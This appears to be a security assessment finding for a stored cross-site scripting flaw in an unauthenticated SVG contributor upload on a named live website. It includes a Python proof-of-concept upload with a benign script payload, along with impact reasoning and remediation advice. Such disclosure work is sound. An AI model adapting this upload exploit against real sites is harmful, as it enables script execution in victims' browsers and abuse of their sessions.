# Stored XSS via unauthenticated SVG contributor upload

**ID:** vuln-0005
**Severity:** MEDIUM
**Found:** 2026-09-04 08:11:43 UTC
**Target:** https://alfikr.id/
**Endpoint:** /create/tulisan/kontributor/
**Method:** POST
**CWE:** CWE-79
**CVSS:** 5.4
**Confidence:** High
**Fix Effort:** Medium

## Description

The unauthenticated contributor submission accepts an SVG containing active script and serves it back inline as `image/svg+xml`. When a user opens the uploaded file, the script executes in the application origin, enabling arbitrary same-origin browser actions.

## Evidence

The uploaded file was retrievable at the affected media path and retained an executable SVG content type:

```http
GET /media/fileTulisan/exec7811.svg HTTP/2
Host: alfikr.id

HTTP/2 200 OK
Content-Type: image/svg+xml
```

Opening the file in Chrome executed the embedded script; the resulting DOM state was:

```text
document.documentElement.getAttribute('data-pwned') == "yes"
```

## Impact

A remote unauthenticated attacker can persist JavaScript on the application’s media path. A user who opens the uploaded SVG executes attacker-controlled code in the application origin; the demonstrated impact is arbitrary DOM modification, with access to same-origin browser capabilities such as authenticated requests and page content.

## Counterevidence

The strongest limiting factor is user interaction: the script does not execute merely from uploading the file, and a victim must navigate to the media URL. No upload authentication, SVG sanitizer, forced-download disposition, separate-origin hosting, or restrictive control preventing the observed Chrome execution was found on this path.

## What Would Change This Severity

Demonstrating automatic embedding of uploaded SVGs into pages viewed by authenticated users without an explicit navigation would raise the severity; confirmation that all uploads are isolated to a separate origin or forcibly downloaded would lower it.

## Technical Analysis

`POST /create/tulisan/kontributor/` accepts the `fileTulisan` multipart field without rejecting active SVG content. The resulting object is retrievable from `/media/fileTulisan/exec7811.svg` and is served inline with `Content-Type: image/svg+xml`; the SVG script remains intact and executes in Chrome when opened under the application origin. No sanitization or forced-download behavior was observed for this upload path.

## Proof of Concept

1. Submit an unauthenticated multipart request to `POST /create/tulisan/kontributor/` with a benign contributor field set and an SVG file supplied as `fileTulisan`.
2. Use an SVG payload whose script sets `document.documentElement.dataset.pwned = 'yes'` when parsed.
3. Open the returned file at `https://alfikr.id/media/fileTulisan/exec7811.svg` in Chrome.
4. Inspect the document root and verify that the `data-pwned` attribute is set to `yes`, proving script execution.

```python
import requests

base = "https://alfikr.id"
svg = """<svg xmlns=\"http://www.w3.org/2000/svg\"><script>document.documentElement.dataset.pwned='yes'</script></svg>"""
files = {"fileTulisan": ("exec7811.svg", svg, "image/svg+xml")}
data = {
    "foto": "",
    "nama": "Contributor",
    "no_hp": "0000000000",
    "email": "contributor@example.invalid",
    "mediaSosial": "",
    "alamat": "",
    "deskripsiDiri": "Contributor submission",
}
response = requests.post(f"{base}/create/tulisan/kontributor/", data=data, files=files, timeout=30)
print(response.status_code)
print(response.url)
print(response.text[:500])

# Open the returned media URL in Chrome and verify:
# document.documentElement.getAttribute('data-pwned') == 'yes'
```

## Remediation

Reject SVG and other active-content formats for contributor uploads unless they are required. If SVG support is business-required, sanitize it with a strict allowlist that removes scripts, event attributes, external references, and active SVG elements before storage. Serve uploaded content from a separate origin, or force downloads with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`; do not serve untrusted SVG inline under the application origin.

## Assumptions

The attacker only needs unauthenticated network access to submit a contributor form. Exploitation requires a user to open the persisted SVG URL; the browser must treat the response as an inline SVG document under the application origin.
